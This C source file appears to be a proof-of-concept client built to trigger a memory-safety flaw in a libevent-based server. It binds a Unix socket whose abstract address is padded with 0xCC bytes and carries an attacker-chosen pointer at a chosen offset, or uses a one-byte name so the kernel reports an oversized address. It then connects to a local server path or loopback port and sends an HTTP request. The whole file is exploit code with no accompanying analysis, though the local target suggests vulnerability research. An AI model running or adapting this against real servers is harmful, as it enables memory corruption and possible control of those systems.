#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>

#define SERVER_PATH "/tmp/libevent_r1.sock"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s set <sun_path_offset> <hexptr> | short | tcp\n", argv[0]);
        return 1;
    }
    int tcp = strcmp(argv[1], "tcp") == 0;
    int fd = socket(tcp ? AF_INET : AF_UNIX, SOCK_STREAM, 0);
    struct timeval tv = {0, 500000};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_un me;
    memset(&me, 0, sizeof(me));
    me.sun_family = AF_UNIX;
    if (strcmp(argv[1], "short") == 0) {
        /* One-byte abstract name; kernel still reports a long sockaddr. */
        me.sun_path[1] = 'S';
        me.sun_path[2] = '\0';
    } else if (argc >= 4 && strcmp(argv[1], "set") == 0) {
        size_t off = strtoul(argv[2], NULL, 0);
        uint64_t ptr = strtoull(argv[3], NULL, 0);
        memset(me.sun_path + 1, 0xCC, sizeof(me.sun_path) - 1);
        size_t n = sizeof(me.sun_path) - off;
        if (n > 8) n = 8;
        memcpy(me.sun_path + off, &ptr, n);
        fprintf(stderr, "[client] sun_path[%zu..%zu] = 0x%016llx (%zu bytes)\n",
                off, off + n - 1, (unsigned long long)ptr, n);
    } else if (!tcp) {
        fprintf(stderr, "usage: %s set <off> <hexptr> | short | tcp\n", argv[0]);
        return 1;
    }

    if (!tcp && bind(fd, (struct sockaddr*)&me, sizeof(me)) < 0) {
        perror("bind"); return 1;
    }
    struct sockaddr_un target;
    struct sockaddr_in tin;
    memset(&target, 0, sizeof(target));
    memset(&tin, 0, sizeof(tin));
    void *addr;
    socklen_t alen;
    if (tcp) {
        tin.sin_family = AF_INET;
        tin.sin_port = htons(18081);
        tin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr = &tin; alen = sizeof(tin);
    } else {
        target.sun_family = AF_UNIX;
        strncpy(target.sun_path, SERVER_PATH, sizeof(target.sun_path) - 1);
        addr = &target; alen = sizeof(target);
    }
    if (connect(fd, addr, alen) < 0) {
        perror("connect"); return 1;
    }
    const char *req = "GET / HTTP/1.0\r\n\r\n";
    (void)write(fd, req, strlen(req));
    char buf[16];
    (void)read(fd, buf, sizeof(buf));
    close(fd);
    return 0;
}
